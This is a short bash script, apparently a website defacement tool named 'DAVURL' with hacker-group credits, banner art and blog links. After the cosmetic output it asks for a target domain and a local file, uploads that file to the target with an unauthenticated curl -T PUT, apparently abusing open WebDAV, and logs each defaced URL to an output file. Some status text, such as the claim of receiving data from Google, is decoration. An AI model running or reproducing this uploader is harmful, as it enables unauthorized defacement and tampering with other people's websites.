#!/bin/bash
#Codec By Codename
#Copyright By Codename
#SLL By https://github.com/nishinosukasa
#Blogspot : https://cruznos.blogspot.com
#Wordpress : https://nostalgiaxploit.wordpress.com

#Color
{
blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
}

#Banner
{
clear
echo -e $red """
______  _______ _    _ _     _  ______       
|     \ |_____|  \  /  |     | |_____/ |     
|_____/ |     |   \/   |_____| |    \_ |_____                                             
"""
}

{
echo -e $green "["$red"127.0.0.1"$green"]" $white"|_|" $green"["$red"127.217.21.78"$green"]"
echo -e $green                 "["$red"Codec By Codename"$green"]"$white"|_|"$green"["$red"Joker Eden"$green"]"
echo -e $white "╭─"$green"davurl@localhost"$cyan" ~/target"$white
read -p " ╰─$ " domain
echo -e $white "╭─"$green"davurl@localhost"$cyan" ~/script"$white
read -p " ╰─$ " script
echo -e $white "╭─"$green"davurl@localhost"$cyan" ~/output.txt"$white
read -p " ╰─$ " output
echo -e $red '[' $white'+' $red']'$white'Sending Files : Please Wait...'
echo -e $red '[' $white'+' $red']'$white'File Name     : $script'
echo -e $red '[' $white'+' $red']'$white'Target        : $domain'
sleep 3
sleep 3
sleep 3
echo -e $white "["$red"Menerima Data Dari Google"$white"]"
curl -T /storage/emulated/0/$script $domain
echo -e $green '[' $red'+' $green']'$cyan'======>$domain/$script'
printf "http://$domain\n" >> $output
echo "Deface Exploit Save Data => data/$output"
echo -e $white''
}